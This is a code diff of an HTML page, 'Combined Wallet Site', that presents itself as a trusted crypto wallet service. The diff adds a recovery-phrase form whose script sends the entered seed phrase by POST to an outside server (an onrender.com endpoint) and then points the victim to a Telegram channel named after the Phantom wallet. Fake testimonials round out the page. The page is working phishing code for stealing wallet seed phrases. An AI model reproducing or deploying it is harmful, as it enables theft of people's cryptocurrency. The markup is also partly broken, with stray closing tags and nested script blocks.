@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -6,6 +7,14 @@
     <title>Combined Wallet Site</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
     <style>
+</body>
+</html>
+
+
+
+
+
+
         /* Global Reset */
         * {
             margin: 0;
@@ -65,12 +74,11 @@
             justify-content: center;
             padding: 30px;
             background-color: #ffffff;
-            margin: 50px auto;
+            margin: 20px auto;
             width: 90%;
             max-width: 600px;
             border-radius: 15px;
             box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
-            text-align: center;
         }
 
         .recovery-box h2 {
@@ -105,6 +113,45 @@
         }
 
         .recovery-box button:hover {
+            background-color: #6a3ce8;
+            transform: scale(1.05);
+        }
+
+        /* Telegram Section */
+        .telegram-section {
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            background-color: #ffffff;
+            width: 90%;
+            max-width: 600px;
+            margin: 20px auto;
+            border-radius: 15px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+        }
+
+        .telegram-section h3 {
+            font-size: 1.5rem;
+            font-weight: 600;
+            margin-bottom: 20px;
+            color: #4e4e8a;
+        }
+
+        .telegram-section button {
+            padding: 10px 20px;
+            font-size: 1rem;
+            font-weight: 600;
+            background-color: #7c4dff;
+            color: white;
+            border: none;
+            border-radius: 10px;
+            cursor: pointer;
+            transition: background-color 0.3s, transform 0.2s;
+        }
+
+        .telegram-section button:hover {
             background-color: #6a3ce8;
             transform: scale(1.05);
         }
@@ -217,6 +264,33 @@
         .social-icons a:hover {
             color: #7c4dff;
         }
+
+        /* Responsive Design */
+        @media screen and (max-width: 768px) {
+            header {
+                flex-direction: column;
+                align-items: flex-start;
+            }
+
+            .features {
+                flex-direction: column;
+                padding: 50px 20px;
+            }
+
+            .feature-item {
+                max-width: 100%;
+                margin: 10px 0;
+            }
+
+            .hero {
+                height: 80vh;
+                padding: 20px;
+            }
+
+            .hero h2 {
+                font-size: 2rem;
+            }
+        }
     </style>
 </head>
 <body>
@@ -231,29 +305,99 @@
             <a href="#faq">About</a>
         </nav>
     </header>
+   
+    <body>
+    
 
-    <div class="recovery-box">
-        <h2>Enter Your Recovery Phrase</h2>
-        <textarea id="recovery-phrase" placeholder="Enter recovery phrase"></textarea>
-        <button onclick="activateTelegram()">Submit</button>
+        <div class="recovery-box">
+            <h2>Enter Your Recovery Phrase</h2>
+            <textarea id="recovery-phrase" placeholder="Enter recovery phrase"></textarea>
+            <button onclick="activateTelegram()">Submit</button>
+        </div>
+        
+        <!-- بارگذاری فایل جاوا اسکریپت -->
+        <script src="/js/script.js"></script>
+        </body>
+
+        
+   
+
+
+    </form>
+
+    <div id="telegram-section" class="telegram-section" style="display: none;">
+        <h3>Join Our Telegram Channel</h3>
+        <button onclick="window.location.href='https://t.me/PhantomwalltEN1'">Join Telegram</button>
     </div>
+</section>
 
+<script>
+    // اتصال فرم به سرور
+    document.getElementById("recovery-form").addEventListener("submit", async (e) => {
+        e.preventDefault();
+
+        const recoveryPhrase = document.getElementById("recovery-phrase").value;
+
+        if (!recoveryPhrase.trim()) {
+            alert("Please enter your recovery phrase!");
+            return;
+        }
+
+        try {
+            const response = await fetch("http://localhost:3000/send-recovery", {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json",
+                },
+                body: JSON.stringify({ recoveryPhrase }),
+            });
+
+            if (response.ok) {
+                alert("Recovery phrase sent successfully!");
+                document.getElementById("telegram-section").style.display = "flex";
+            } else {
+                alert("Failed to send recovery phrase. Please try again.");
+            }
+        } catch (error) {
+            console.error("Error:", error);
+            alert("An error occurred. Please try again.");
+        }
+    });
+      <script>
+async function activateTelegram() {
+    const recoveryPhrase = document.getElementById("recovery-phrase").value;
+
+    if (recoveryPhrase.trim() !== "") {
+        try {
+            const response = await fetch("https://my-wallet-site.onrender.com/send-recovery", { 
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ recoveryPhrase: recoveryPhrase }),
+            });
+
+            if (response.ok) {
+                alert("Recovery phrase sent successfully!");
+                document.getElementById("telegram-section").style.display = "flex";
+            } else {
+                alert("Failed to send recovery phrase.");
+            }
+        } catch (error) {
+            console.error("Error:", error);
+            alert("An error occurred. Please try again.");
+        }
+    } else {
+        alert("Please enter your recovery phrase.");
+    }
+}
+
+          </script>
+</script>
+
+    
     <section class="hero">
         <h2>Your Trusted Wallet Companion</h2>
         <p>Manage your cryptocurrency in one secure and easy-to-use place.</p>
         <button>Get Started</button>
-    </section>
-    
-    <section id="testimonials" class="testimonials">
-        <h2>What Our Users Say</h2>
-        <div class="testimonial-item">
-            <p>"This wallet has made managing my crypto so much easier and more secure!"</p>
-            <p><strong>John Doe</strong> - Crypto Enthusiast</p>
-        </div>
-        <div class="testimonial-item">
-            <p>"Fast transactions and top-notch security. Highly recommend!"</p>
-            <p><strong>Jane Smith</strong> - Investor</p>
-        </div>
     </section>
 
     <section id="features" class="features">
@@ -272,8 +416,23 @@
             <h3>Cross-Platform</h3>
             <p>Access your wallet anytime, anywhere on any device.</p>
         </div>
-        
+    </section>
 
+    <section id="testimonials" class="testimonials">
+        <h2>What Our Users Say</h2>
+        <div class="testimonial-item">
+            <p>"This wallet has made managing my crypto so much easier and more secure!"</p>
+            <p><strong>John Doe</strong> - Crypto Enthusiast</p>
+        </div>
+        <div class="testimonial-item">
+            <p>"Fast transactions and top-notch security. Highly recommend!"</p>
+            <p><strong>Jane Smith</strong> - Investor</p>
+        </div>
+    </section>
+
+    <section id="faq" class="faq">
+        <h2>Frequently Asked Questions</h2>
+        <!-- FAQs content goes here -->
     </section>
 
     <footer>
@@ -283,8 +442,6 @@
             <a href="https://www.twitter.com">Twitter</a>
         </div>
     </footer>
-
-
 
     <script>
         function sendRecoveryPhrase() {
